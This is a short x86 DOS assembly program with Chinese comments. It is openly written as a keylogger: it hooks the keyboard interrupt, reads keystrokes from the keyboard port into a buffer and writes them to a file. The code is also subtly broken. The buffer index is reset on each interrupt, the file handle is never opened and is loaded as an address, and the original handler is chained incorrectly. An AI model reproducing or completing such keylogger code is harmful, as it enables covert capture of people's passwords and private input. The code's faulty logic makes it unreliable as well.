[org 0x100]

start:
    ; 保存当前 INT 9 的中断向量
    mov ax, 0x3509
    int 0x21
    mov word [old_int9_offset], bx
    mov word [old_int9_segment], es

    ; 设置新的中断向量
    mov dx, keylogger_handler
    mov ax, 0x2509
    int 0x21

    ; 持续运行
    jmp $

keylogger_handler:
    ; 读取键盘输入
    push ax
    push bx
    push cx
    in al, 0x60
    mov ah, 0
    mov [log_buffer + bx], al
    inc bx

    ; 如果满了，写入文件
    cmp bx, 256
    jne .end
    mov ah, 0x40
    mov bx, log_handle
    mov cx, 256
    lea dx, log_buffer
    int 0x21
    xor bx, bx  ; 重置偏移

.end:
    ; 调用原来的 INT 9
    call far [old_int9_offset]
    pop cx
    pop bx
    pop ax
    iret

old_int9_offset dw 0
old_int9_segment dw 0
log_buffer db 256 dup(0)
log_handle dw 0